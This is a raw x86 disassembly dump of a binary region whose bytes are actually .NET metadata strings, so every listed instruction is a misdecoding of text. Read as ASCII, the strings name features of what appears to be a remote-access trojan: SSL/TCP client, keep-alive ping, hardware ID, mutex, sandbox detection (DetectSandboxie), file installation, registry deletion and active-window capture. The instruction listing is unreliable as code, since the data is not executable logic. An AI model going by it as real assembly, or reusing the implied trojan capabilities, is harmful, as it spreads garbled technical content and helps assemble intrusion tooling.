  405a0a:	46                   	inc    %esi
  405a0b:	31 36                	xor    %esi,(%esi)
  405a0d:	39 32                	cmp    %esi,(%edx)
  405a0f:	43                   	inc    %ebx
  405a10:	45                   	inc    %ebp
  405a11:	39 39                	cmp    %edi,(%ecx)
  405a13:	34 37                	xor    $0x37,%al
  405a15:	41                   	inc    %ecx
  405a16:	31 39                	xor    %edi,(%ecx)
  405a18:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  405a1c:	36 39 38             	cmp    %edi,%ss:(%eax)
  405a1f:	44                   	inc    %esp
  405a20:	38 46 35             	cmp    %al,0x35(%esi)
  405a23:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  405a27:	41                   	inc    %ecx
  405a28:	37                   	aaa
  405a29:	32 31                	xor    (%ecx),%dh
  405a2b:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  405a31:	43                   	inc    %ebx
  405a32:	35 38 42 00 47       	xor    $0x47004238,%eax
  405a37:	43                   	inc    %ebx
  405a38:	00 45 53             	add    %al,0x53(%ebp)
  405a3b:	5f                   	pop    %edi
  405a3c:	53                   	push   %ebx
  405a3d:	59                   	pop    %ecx
  405a3e:	53                   	push   %ebx
  405a3f:	54                   	push   %esp
  405a40:	45                   	inc    %ebp
  405a41:	4d                   	dec    %ebp
  405a42:	5f                   	pop    %edi
  405a43:	52                   	push   %edx
  405a44:	45                   	inc    %ebp
  405a45:	51                   	push   %ecx
  405a46:	55                   	push   %ebp
  405a47:	49                   	dec    %ecx
  405a48:	52                   	push   %edx
  405a49:	45                   	inc    %ebp
  405a4a:	44                   	inc    %esp
  405a4b:	00 45 53             	add    %al,0x53(%ebp)
  405a4e:	5f                   	pop    %edi
  405a4f:	44                   	inc    %esp
  405a50:	49                   	dec    %ecx
  405a51:	53                   	push   %ebx
  405a52:	50                   	push   %eax
  405a53:	4c                   	dec    %esp
  405a54:	41                   	inc    %ecx
  405a55:	59                   	pop    %ecx
  405a56:	5f                   	pop    %edi
  405a57:	52                   	push   %edx
  405a58:	45                   	inc    %ebp
  405a59:	51                   	push   %ecx
  405a5a:	55                   	push   %ebp
  405a5b:	49                   	dec    %ecx
  405a5c:	52                   	push   %edx
  405a5d:	45                   	inc    %ebp
  405a5e:	44                   	inc    %esp
  405a5f:	00 4d 61             	add    %cl,0x61(%ebp)
  405a62:	70 4e                	jo     0x405ab2
  405a64:	61                   	popa
  405a65:	6d                   	insl   (%dx),%es:(%edi)
  405a66:	65 54                	gs push %esp
  405a68:	6f                   	outsl  %ds:(%esi),(%dx)
  405a69:	4f                   	dec    %edi
  405a6a:	49                   	dec    %ecx
  405a6b:	44                   	inc    %esp
  405a6c:	00 67 65             	add    %ah,0x65(%edi)
  405a6f:	74 5f                	je     0x405ad0
  405a71:	46                   	inc    %esi
  405a72:	6f                   	outsl  %ds:(%esi),(%dx)
  405a73:	72 6d                	jb     0x405ae2
  405a75:	61                   	popa
  405a76:	74 49                	je     0x405ac1
  405a78:	44                   	inc    %esp
  405a79:	00 45 58             	add    %al,0x58(%ebp)
  405a7c:	45                   	inc    %ebp
  405a7d:	43                   	inc    %ebx
  405a7e:	55                   	push   %ebp
  405a7f:	54                   	push   %esp
  405a80:	49                   	dec    %ecx
  405a81:	4f                   	dec    %edi
  405a82:	4e                   	dec    %esi
  405a83:	5f                   	pop    %edi
  405a84:	53                   	push   %ebx
  405a85:	54                   	push   %esp
  405a86:	41                   	inc    %ecx
  405a87:	54                   	push   %esp
  405a88:	45                   	inc    %ebp
  405a89:	00 67 65             	add    %ah,0x65(%edi)
  405a8c:	74 5f                	je     0x405aed
  405a8e:	41                   	inc    %ecx
  405a8f:	53                   	push   %ebx
  405a90:	43                   	inc    %ebx
  405a91:	49                   	dec    %ecx
  405a92:	49                   	dec    %ecx
  405a93:	00 53 79             	add    %dl,0x79(%ebx)
  405a96:	73 74                	jae    0x405b0c
  405a98:	65 6d                	gs insl (%dx),%es:(%edi)
  405a9a:	2e 49                	cs dec %ecx
  405a9c:	4f                   	dec    %edi
  405a9d:	00 41 55             	add    %al,0x55(%ecx)
  405aa0:	38 38                	cmp    %bh,(%eax)
  405aa2:	41                   	inc    %ecx
  405aa3:	50                   	push   %eax
  405aa4:	50                   	push   %eax
  405aa5:	00 49 73             	add    %cl,0x73(%ecx)
  405aa8:	58                   	pop    %eax
  405aa9:	50                   	push   %eax
  405aaa:	00 42 44             	add    %al,0x44(%edx)
  405aad:	4f                   	dec    %edi
  405aae:	53                   	push   %ebx
  405aaf:	00 45 53             	add    %al,0x53(%ebp)
  405ab2:	5f                   	pop    %edi
  405ab3:	43                   	inc    %ebx
  405ab4:	4f                   	dec    %edi
  405ab5:	4e                   	dec    %esi
  405ab6:	54                   	push   %esp
  405ab7:	49                   	dec    %ecx
  405ab8:	4e                   	dec    %esi
  405ab9:	55                   	push   %ebp
  405aba:	4f                   	dec    %edi
  405abb:	55                   	push   %ebp
  405abc:	53                   	push   %ebx
  405abd:	00 67 65             	add    %ah,0x65(%edi)
  405ac0:	74 5f                	je     0x405b21
  405ac2:	49                   	dec    %ecx
  405ac3:	56                   	push   %esi
  405ac4:	00 73 65             	add    %dh,0x65(%ebx)
  405ac7:	74 5f                	je     0x405b28
  405ac9:	49                   	dec    %ecx
  405aca:	56                   	push   %esi
  405acb:	00 47 65             	add    %al,0x65(%edi)
  405ace:	6e                   	outsb  %ds:(%esi),(%dx)
  405acf:	65 72 61             	gs jb  0x405b33
  405ad2:	74 65                	je     0x405b39
  405ad4:	49                   	dec    %ecx
  405ad5:	56                   	push   %esi
  405ad6:	00 4d 54             	add    %cl,0x54(%ebp)
  405ad9:	58                   	pop    %eax
  405ada:	00 76 61             	add    %dh,0x61(%esi)
  405add:	6c                   	insb   (%dx),%es:(%edi)
  405ade:	75 65                	jne    0x405b45
  405ae0:	5f                   	pop    %edi
  405ae1:	5f                   	pop    %edi
  405ae2:	00 52 65             	add    %dl,0x65(%edx)
  405ae5:	61                   	popa
  405ae6:	64 53                	fs push %ebx
  405ae8:	65 72 76             	gs jb  0x405b61
  405aeb:	65 72 74             	gs jb  0x405b62
  405aee:	44                   	inc    %esp
  405aef:	61                   	popa
  405af0:	74 61                	je     0x405b53
  405af2:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  405af6:	61                   	popa
  405af7:	00 4d 65             	add    %cl,0x65(%ebp)
  405afa:	73 73                	jae    0x405b6f
  405afc:	61                   	popa
  405afd:	67 65 50             	addr16 gs push %eax
  405b00:	61                   	popa
  405b01:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  405b04:	69 62 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%edx),%esp
  405b0b:	72 6c                	jb     0x405b79
  405b0d:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  405b14:	65 6d                	gs insl (%dx),%es:(%edi)
  405b16:	2e 43                	cs inc %ebx
  405b18:	6f                   	outsl  %ds:(%esi),(%dx)
  405b19:	6c                   	insb   (%dx),%es:(%edi)
  405b1a:	6c                   	insb   (%dx),%es:(%edi)
  405b1b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405b20:	6e                   	outsb  %ds:(%esi),(%dx)
  405b21:	73 2e                	jae    0x405b51
  405b23:	47                   	inc    %edi
  405b24:	65 6e                	outsb  %gs:(%esi),(%dx)
  405b26:	65 72 69             	gs jb  0x405b92
  405b29:	63 00                	arpl   %eax,(%eax)
  405b2b:	4d                   	dec    %ebp
  405b2c:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  405b33:	74 2e                	je     0x405b63
  405b35:	56                   	push   %esi
  405b36:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  405b3d:	73 69                	jae    0x405ba8
  405b3f:	63 00                	arpl   %eax,(%eax)
  405b41:	67 65 74 5f          	addr16 gs je 0x405ba4
  405b45:	53                   	push   %ebx
  405b46:	65 6e                	outsb  %gs:(%esi),(%dx)
  405b48:	64 53                	fs push %ebx
  405b4a:	79 6e                	jns    0x405bba
  405b4c:	63 00                	arpl   %eax,(%eax)
  405b4e:	45                   	inc    %ebp
  405b4f:	6e                   	outsb  %ds:(%esi),(%dx)
  405b50:	64 52                	fs push %edx
  405b52:	65 61                	gs popa
  405b54:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  405b58:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  405b5f:	00 
  405b60:	54                   	push   %esp
  405b61:	68 72 65 61 64       	push   $0x64616572
  405b66:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  405b6a:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  405b6e:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  405b72:	41                   	inc    %ecx
  405b73:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  405b79:	61                   	popa
  405b7a:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  405b80:	74 5f                	je     0x405be1
  405b82:	43                   	inc    %ebx
  405b83:	6f                   	outsl  %ds:(%esi),(%dx)
  405b84:	6e                   	outsb  %ds:(%esi),(%dx)
  405b85:	6e                   	outsb  %ds:(%esi),(%dx)
  405b86:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405b8b:	00 67 65             	add    %ah,0x65(%edi)
  405b8e:	74 5f                	je     0x405bef
  405b90:	49                   	dec    %ecx
  405b91:	73 43                	jae    0x405bd6
  405b93:	6f                   	outsl  %ds:(%esi),(%dx)
  405b94:	6e                   	outsb  %ds:(%esi),(%dx)
  405b95:	6e                   	outsb  %ds:(%esi),(%dx)
  405b96:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405b9b:	00 73 65             	add    %dh,0x65(%ebx)
  405b9e:	74 5f                	je     0x405bff
  405ba0:	49                   	dec    %ecx
  405ba1:	73 43                	jae    0x405be6
  405ba3:	6f                   	outsl  %ds:(%esi),(%dx)
  405ba4:	6e                   	outsb  %ds:(%esi),(%dx)
  405ba5:	6e                   	outsb  %ds:(%esi),(%dx)
  405ba6:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405bab:	00 52 65             	add    %dl,0x65(%edx)
  405bae:	63 65 69             	arpl   %esp,0x69(%ebp)
  405bb1:	76 65                	jbe    0x405c18
  405bb3:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  405bb7:	74 5f                	je     0x405c18
  405bb9:	47                   	inc    %edi
  405bba:	75 69                	jne    0x405c25
  405bbc:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  405bc0:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  405bc7:	64 
  405bc8:	53                   	push   %ebx
  405bc9:	79 6e                	jns    0x405c39
  405bcb:	63 3e                	arpl   %edi,(%esi)
  405bcd:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  405bd1:	61                   	popa
  405bd2:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405bd5:	6e                   	outsb  %ds:(%esi),(%dx)
  405bd6:	67 46                	addr16 inc %esi
  405bd8:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  405bdf:	73 43                	jae    0x405c24
  405be1:	6f                   	outsl  %ds:(%esi),(%dx)
  405be2:	6e                   	outsb  %ds:(%esi),(%dx)
  405be3:	6e                   	outsb  %ds:(%esi),(%dx)
  405be4:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405be9:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  405bee:	61                   	popa
  405bef:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405bf2:	6e                   	outsb  %ds:(%esi),(%dx)
  405bf3:	67 46                	addr16 inc %esi
  405bf5:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  405bfc:	65 65 70 41          	gs gs jo 0x405c41
  405c00:	6c                   	insb   (%dx),%es:(%edi)
  405c01:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  405c08:	42                   	inc    %edx
  405c09:	61                   	popa
  405c0a:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c0d:	6e                   	outsb  %ds:(%esi),(%dx)
  405c0e:	67 46                	addr16 inc %esi
  405c10:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  405c17:	65 61                	gs popa
  405c19:	64 65 72 53          	fs gs jb 0x405c70
  405c1d:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  405c24:	42                   	inc    %edx
  405c25:	61                   	popa
  405c26:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c29:	6e                   	outsb  %ds:(%esi),(%dx)
  405c2a:	67 46                	addr16 inc %esi
  405c2c:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  405c33:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  405c3a:	42                   	inc    %edx
  405c3b:	61                   	popa
  405c3c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c3f:	6e                   	outsb  %ds:(%esi),(%dx)
  405c40:	67 46                	addr16 inc %esi
  405c42:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  405c49:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  405c4d:	61                   	popa
  405c4e:	74 65                	je     0x405cb5
  405c50:	50                   	push   %eax
  405c51:	6f                   	outsl  %ds:(%esi),(%dx)
  405c52:	6e                   	outsb  %ds:(%esi),(%dx)
  405c53:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  405c59:	61                   	popa
  405c5a:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c5d:	6e                   	outsb  %ds:(%esi),(%dx)
  405c5e:	67 46                	addr16 inc %esi
  405c60:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  405c67:	6e                   	outsb  %ds:(%esi),(%dx)
  405c68:	74 65                	je     0x405ccf
  405c6a:	72 76                	jb     0x405ce2
  405c6c:	61                   	popa
  405c6d:	6c                   	insb   (%dx),%es:(%edi)
  405c6e:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  405c73:	61                   	popa
  405c74:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c77:	6e                   	outsb  %ds:(%esi),(%dx)
  405c78:	67 46                	addr16 inc %esi
  405c7a:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  405c81:	75 66                	jne    0x405ce9
  405c83:	66 65 72 3e          	data16 gs jb 0x405cc5
  405c87:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  405c8b:	61                   	popa
  405c8c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c8f:	6e                   	outsb  %ds:(%esi),(%dx)
  405c90:	67 46                	addr16 inc %esi
  405c92:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  405c99:	66 66 73 65          	data16 data16 jae 0x405d02
  405c9d:	74 3e                	je     0x405cdd
  405c9f:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  405ca3:	61                   	popa
  405ca4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405ca7:	6e                   	outsb  %ds:(%esi),(%dx)
  405ca8:	67 46                	addr16 inc %esi
  405caa:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  405cb1:	73 6c                	jae    0x405d1f
  405cb3:	43                   	inc    %ebx
  405cb4:	6c                   	insb   (%dx),%es:(%edi)
  405cb5:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  405cbc:	5f                   	pop    %edi
  405cbd:	42                   	inc    %edx
  405cbe:	61                   	popa
  405cbf:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405cc2:	6e                   	outsb  %ds:(%esi),(%dx)
  405cc3:	67 46                	addr16 inc %esi
  405cc5:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  405ccc:	63 70 43             	arpl   %esi,0x43(%eax)
  405ccf:	6c                   	insb   (%dx),%es:(%edi)
  405cd0:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  405cd7:	5f                   	pop    %edi
  405cd8:	42                   	inc    %edx
  405cd9:	61                   	popa
  405cda:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405cdd:	6e                   	outsb  %ds:(%esi),(%dx)
  405cde:	67 46                	addr16 inc %esi
  405ce0:	69 65 6c 64 00 68 57 	imul   $0x57680064,0x6c(%ebp),%esp
  405ce7:	6e                   	outsb  %ds:(%esi),(%dx)
  405ce8:	64 00 53 65          	add    %dl,%fs:0x65(%ebx)
  405cec:	6e                   	outsb  %ds:(%esi),(%dx)
  405ced:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  405cf1:	70 65                	jo     0x405d58
  405cf3:	6e                   	outsb  %ds:(%esi),(%dx)
  405cf4:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  405cf8:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  405cff:	61 
  405d00:	6c                   	insb   (%dx),%es:(%edi)
  405d01:	75 65                	jne    0x405d68
  405d03:	4b                   	dec    %ebx
  405d04:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  405d0b:	6c                   	insb   (%dx),%es:(%edi)
  405d0c:	61                   	popa
  405d0d:	63 65 00             	arpl   %esp,0x0(%ebp)
  405d10:	43                   	inc    %ebx
  405d11:	72 65                	jb     0x405d78
  405d13:	61                   	popa
  405d14:	74 65                	je     0x405d7b
  405d16:	49                   	dec    %ecx
  405d17:	6e                   	outsb  %ds:(%esi),(%dx)
  405d18:	73 74                	jae    0x405d8e
  405d1a:	61                   	popa
  405d1b:	6e                   	outsb  %ds:(%esi),(%dx)
  405d1c:	63 65 00             	arpl   %esp,0x0(%ebp)
  405d1f:	73 65                	jae    0x405d86
  405d21:	74 5f                	je     0x405d82
  405d23:	4d                   	dec    %ebp
  405d24:	6f                   	outsl  %ds:(%esi),(%dx)
  405d25:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  405d2a:	6c                   	insb   (%dx),%es:(%edi)
  405d2b:	65 4d                	gs dec %ebp
  405d2d:	6f                   	outsl  %ds:(%esi),(%dx)
  405d2e:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  405d33:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  405d3a:	64 65 
  405d3c:	00 45 6e             	add    %al,0x6e(%ebp)
  405d3f:	74 65                	je     0x405da6
  405d41:	72 44                	jb     0x405d87
  405d43:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  405d47:	4d                   	dec    %ebp
  405d48:	6f                   	outsl  %ds:(%esi),(%dx)
  405d49:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  405d4e:	79 70                	jns    0x405dc0
  405d50:	74 6f                	je     0x405dc1
  405d52:	53                   	push   %ebx
  405d53:	74 72                	je     0x405dc7
  405d55:	65 61                	gs popa
  405d57:	6d                   	insl   (%dx),%es:(%edi)
  405d58:	4d                   	dec    %ebp
  405d59:	6f                   	outsl  %ds:(%esi),(%dx)
  405d5a:	64 65 00 43 69       	fs add %al,%gs:0x69(%ebx)
  405d5f:	70 68                	jo     0x405dc9
  405d61:	65 72 4d             	gs jb  0x405db1
  405d64:	6f                   	outsl  %ds:(%esi),(%dx)
  405d65:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  405d6a:	6c                   	insb   (%dx),%es:(%edi)
  405d6b:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  405d70:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  405d76:	65 74 65             	gs je  0x405dde
  405d79:	53                   	push   %ebx
  405d7a:	75 62                	jne    0x405dde
  405d7c:	4b                   	dec    %ebx
  405d7d:	65 79 54             	gs jns 0x405dd4
  405d80:	72 65                	jb     0x405de7
  405d82:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405d86:	74 5f                	je     0x405de7
  405d88:	4d                   	dec    %ebp
  405d89:	65 73 73             	gs jae 0x405dff
  405d8c:	61                   	popa
  405d8d:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  405d92:	74 65                	je     0x405df9
  405d94:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  405d98:	6e                   	outsb  %ds:(%esi),(%dx)
  405d99:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  405d9d:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  405da4:	6b 65 00 45          	imul   $0x45,0x0(%ebp),%esp
  405da8:	6e                   	outsb  %ds:(%esi),(%dx)
  405da9:	75 6d                	jne    0x405e18
  405dab:	65 72 61             	gs jb  0x405e0f
  405dae:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  405db2:	49                   	dec    %ecx
  405db3:	44                   	inc    %esp
  405db4:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  405dbb:	6c                   	insb   (%dx),%es:(%edi)
  405dbc:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405dc0:	74 5f                	je     0x405e21
  405dc2:	48                   	dec    %eax
  405dc3:	61                   	popa
  405dc4:	6e                   	outsb  %ds:(%esi),(%dx)
  405dc5:	64 6c                	fs insb (%dx),%es:(%edi)
  405dc7:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  405dcb:	6e                   	outsb  %ds:(%esi),(%dx)
  405dcc:	74 69                	je     0x405e37
  405dce:	6d                   	insl   (%dx),%es:(%edi)
  405dcf:	65 46                	gs inc %esi
  405dd1:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  405dd8:	64 6c                	fs insb (%dx),%es:(%edi)
  405dda:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405dde:	74 4d                	je     0x405e2d
  405de0:	6f                   	outsl  %ds:(%esi),(%dx)
  405de1:	64 75 6c             	fs jne 0x405e50
  405de4:	65 48                	gs dec %eax
  405de6:	61                   	popa
  405de7:	6e                   	outsb  %ds:(%esi),(%dx)
  405de8:	64 6c                	fs insb (%dx),%es:(%edi)
  405dea:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  405dee:	6e                   	outsb  %ds:(%esi),(%dx)
  405def:	74 69                	je     0x405e5a
  405df1:	6d                   	insl   (%dx),%es:(%edi)
  405df2:	65 54                	gs push %esp
  405df4:	79 70                	jns    0x405e66
  405df6:	65 48                	gs dec %eax
  405df8:	61                   	popa
  405df9:	6e                   	outsb  %ds:(%esi),(%dx)
  405dfa:	64 6c                	fs insb (%dx),%es:(%edi)
  405dfc:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405e00:	74 54                	je     0x405e56
  405e02:	79 70                	jns    0x405e74
  405e04:	65 46                	gs inc %esi
  405e06:	72 6f                	jb     0x405e77
  405e08:	6d                   	insl   (%dx),%es:(%edi)
  405e09:	48                   	dec    %eax
  405e0a:	61                   	popa
  405e0b:	6e                   	outsb  %ds:(%esi),(%dx)
  405e0c:	64 6c                	fs insb (%dx),%es:(%edi)
  405e0e:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  405e12:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  405e19:	65 
  405e1a:	00 49 6e             	add    %cl,0x6e(%ecx)
  405e1d:	73 74                	jae    0x405e93
  405e1f:	61                   	popa
  405e20:	6c                   	insb   (%dx),%es:(%edi)
  405e21:	6c                   	insb   (%dx),%es:(%edi)
  405e22:	46                   	inc    %esi
  405e23:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  405e2a:	6e 
  405e2b:	52                   	push   %edx
  405e2c:	6f                   	outsl  %ds:(%esi),(%dx)
  405e2d:	6c                   	insb   (%dx),%es:(%edi)
  405e2e:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  405e32:	6e                   	outsb  %ds:(%esi),(%dx)
  405e33:	64 6f                	outsl  %fs:(%esi),(%dx)
  405e35:	77 73                	ja     0x405eaa
  405e37:	42                   	inc    %edx
  405e38:	75 69                	jne    0x405ea3
  405e3a:	6c                   	insb   (%dx),%es:(%edi)
  405e3b:	74 49                	je     0x405e86
  405e3d:	6e                   	outsb  %ds:(%esi),(%dx)
  405e3e:	52                   	push   %edx
  405e3f:	6f                   	outsl  %ds:(%esi),(%dx)
  405e40:	6c                   	insb   (%dx),%es:(%edi)
  405e41:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405e45:	74 41                	je     0x405e88
  405e47:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  405e4b:	65 57                	gs push %edi
  405e4d:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  405e54:	74 6c                	je     0x405ec2
  405e56:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e5a:	74 5f                	je     0x405ebb
  405e5c:	4d                   	dec    %ebp
  405e5d:	61                   	popa
  405e5e:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  405e65:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  405e69:	6f                   	outsl  %ds:(%esi),(%dx)
  405e6a:	63 65 73             	arpl   %esp,0x73(%ebp)
  405e6d:	73 4d                	jae    0x405ebc
  405e6f:	6f                   	outsl  %ds:(%esi),(%dx)
  405e70:	64 75 6c             	fs jne 0x405edf
  405e73:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405e77:	74 5f                	je     0x405ed8
  405e79:	57                   	push   %edi
  405e7a:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  405e81:	79 6c                	jns    0x405eef
  405e83:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  405e87:	6f                   	outsl  %ds:(%esi),(%dx)
  405e88:	63 65 73             	arpl   %esp,0x73(%ebp)
  405e8b:	73 57                	jae    0x405ee4
  405e8d:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  405e94:	79 6c                	jns    0x405f02
  405e96:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e9a:	74 5f                	je     0x405efb
  405e9c:	4e                   	dec    %esi
  405e9d:	61                   	popa
  405e9e:	6d                   	insl   (%dx),%es:(%edi)
  405e9f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405ea3:	74 5f                	je     0x405f04
  405ea5:	46                   	inc    %esi
  405ea6:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405ead:	00 
  405eae:	73 65                	jae    0x405f15
  405eb0:	74 5f                	je     0x405f11
  405eb2:	46                   	inc    %esi
  405eb3:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405eba:	00 
  405ebb:	47                   	inc    %edi
  405ebc:	65 74 54             	gs je  0x405f13
  405ebf:	65 6d                	gs insl (%dx),%es:(%edi)
  405ec1:	70 46                	jo     0x405f09
  405ec3:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405eca:	00 
  405ecb:	47                   	inc    %edi
  405ecc:	65 74 46             	gs je  0x405f15
  405ecf:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405ed6:	00 
  405ed7:	6c                   	insb   (%dx),%es:(%edi)
  405ed8:	70 4d                	jo     0x405f27
  405eda:	6f                   	outsl  %ds:(%esi),(%dx)
  405edb:	64 75 6c             	fs jne 0x405f4a
  405ede:	65 4e                	gs dec %esi
  405ee0:	61                   	popa
  405ee1:	6d                   	insl   (%dx),%es:(%edi)
  405ee2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405ee6:	74 5f                	je     0x405f47
  405ee8:	4d                   	dec    %ebp
  405ee9:	61                   	popa
  405eea:	63 68 69             	arpl   %ebp,0x69(%eax)
  405eed:	6e                   	outsb  %ds:(%esi),(%dx)
  405eee:	65 4e                	gs dec %esi
  405ef0:	61                   	popa
  405ef1:	6d                   	insl   (%dx),%es:(%edi)
  405ef2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405ef6:	74 5f                	je     0x405f57
  405ef8:	4f                   	dec    %edi
  405ef9:	53                   	push   %ebx
  405efa:	46                   	inc    %esi
  405efb:	75 6c                	jne    0x405f69
  405efd:	6c                   	insb   (%dx),%es:(%edi)
  405efe:	4e                   	dec    %esi
  405eff:	61                   	popa
  405f00:	6d                   	insl   (%dx),%es:(%edi)
  405f01:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405f05:	74 5f                	je     0x405f66
  405f07:	46                   	inc    %esi
  405f08:	75 6c                	jne    0x405f76
  405f0a:	6c                   	insb   (%dx),%es:(%edi)
  405f0b:	4e                   	dec    %esi
  405f0c:	61                   	popa
  405f0d:	6d                   	insl   (%dx),%es:(%edi)
  405f0e:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  405f12:	56                   	push   %esi
  405f13:	61                   	popa
  405f14:	6c                   	insb   (%dx),%es:(%edi)
